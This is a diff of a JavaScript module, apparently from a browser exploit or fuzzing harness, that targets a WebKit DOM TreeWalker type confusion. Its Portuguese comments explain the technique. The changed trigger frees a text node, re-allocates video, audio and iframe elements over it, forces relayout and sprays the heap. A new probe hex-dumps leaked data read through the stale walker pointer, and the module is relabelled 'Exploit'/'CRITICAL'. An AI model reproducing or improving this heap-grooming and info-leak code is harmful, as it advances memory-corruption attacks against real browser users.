@@ -3,11 +3,12 @@ import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'TREEWALKER_TYPE_CONFUSION',
-    category: 'DOM',
-    risk:     'HIGH',
+    category: 'Exploit',
+    risk:     'CRITICAL',
     description:
-        'O TreeWalker C++ retém ponteiros nativos. Mutamos os nós por baixo e forçamos ' +
-        'outros tipos (vídeo/áudio) a ocuparem o mesmo espaço de memória (Type Confusion).',
+        'Type Confusion via DOM TreeWalker. O DOM original é destruído, mas o Walker retém ' +
+        'um ponteiro stale. Injetamos elementos nativos pesados (<video>) e forçamos o relayout ' +
+        'para instanciar os objetos C++ complexos sobre a memória do TextNode antigo.',
 
     setup: function() {
         this.sandbox = document.createElement('div');
@@ -16,31 +17,50 @@ export default {
         
         this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
         this.walker.nextNode(); // span
-        this.walker.nextNode(); // b
+        this.walker.nextNode(); // text "A" (Alvo)
         
         this.targetNode = this.walker.currentNode;
-
-        // 🚨 Oráculo: Vigia o Nó B
         if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
     },
 
     trigger: function() {
-        // Destrói os nós onde o Walker está pisando.
-        this.sandbox.innerHTML = '<video></video><audio></audio>';
+        // 1. Apagamos o nó antigo (Liberta a memória no bmalloc)
+        this.sandbox.innerHTML = '';
         
-        // 🚨 Grooming: Forçamos a alocação de objetos complexos (vídeos)
-        // para tentarem preencher o endereço de memória deixado pelo <b> (Type Confusion)
-        let nodes = Groomer.sprayDOM('video', 100);
-        Groomer.punchHoles(nodes, 2);
+        // 2. Injetamos elementos com estruturas C++ massivas (MediaPlayerPrivate, etc)
+        this.sandbox.innerHTML = '<video controls></video><audio></audio><iframe></iframe>';
+        
+        // FIX: Forçamos o WebKit a desenhar os elementos AGORA.
+        // Isto obriga a alocação dos objetos nativos C++ no heap, possivelmente
+        // caindo no exato mesmo endereço de memória do antigo text "A".
+        void this.sandbox.firstChild.offsetWidth;
+        
+        // Inundação secundária para empurrar o GC
+        let trash = Groomer.sprayDOM('div', 200);
+        Groomer.punchHoles(trash, 2);
     },
 
     probe: [
-        s => s.walker.currentNode.nodeType,
+        // Probe 0: O nó fantasma mudou de identidade?
         s => s.walker.currentNode.nodeName,
-        s => s.walker.currentNode.isConnected, 
-        s => s.walker.previousNode() !== null, 
-        s => s.targetNode.nodeType,            
-        s => s.targetNode.isConnected          
+        
+        // Probe 1: Extrator OOB (Se o C++ achar que o vídeo é um texto)
+        s => {
+            let nodeName = s.walker.currentNode.nodeName;
+            if (nodeName !== '#text') {
+                try {
+                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
+                    if (leakedData && leakedData !== 'A') {
+                        let hexDump = '';
+                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
+                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
+                        }
+                        return `💥 INFO LEAK (Type Confusion Real): ${hexDump}`;
+                    }
+                } catch(e) { return `Crash seguro: ${e.message}`; }
+            }
+            return 'Nó não sobreposto ou seguro';
+        }
     ],
 
     cleanup: function() {
